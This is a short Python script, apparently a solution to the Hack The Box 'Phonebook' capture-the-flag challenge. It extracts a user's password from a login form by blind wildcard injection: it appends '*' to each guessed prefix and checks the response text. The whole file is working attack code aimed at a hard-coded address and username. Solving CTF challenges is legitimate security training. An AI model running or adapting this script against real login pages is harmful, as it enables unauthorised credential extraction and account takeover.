#!/usr/bin/python3
# HTB https://app.hackthebox.com/challenges/phonebook

import sys
import requests
import string
from colorama import Fore

import requests

# URL to send requests to (replace with your URL)
url = "http://167.172.62.51:30796/login?message=Authentication%20failed"

# Characters to use in the password
characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}"

# Username
username = "Reese"

# Initialize an empty password
password = ""

session = requests.Session()

i = 0
# Loop through characters
while(i < len(characters)):

    # Send the request with the updated password
    response = session.post(url, data={"username": username, "password": password+characters[i]+"*"}, allow_redirects=True)
    # Check if the response contains "Authentication failed"
    if "Please login" not in response.text:
        print(f"Character passed: {characters[i]}")
        password += characters[i]
        i = 0
    else:
        i += 1

# Print the complete password
print(f"Complete password: {password}")
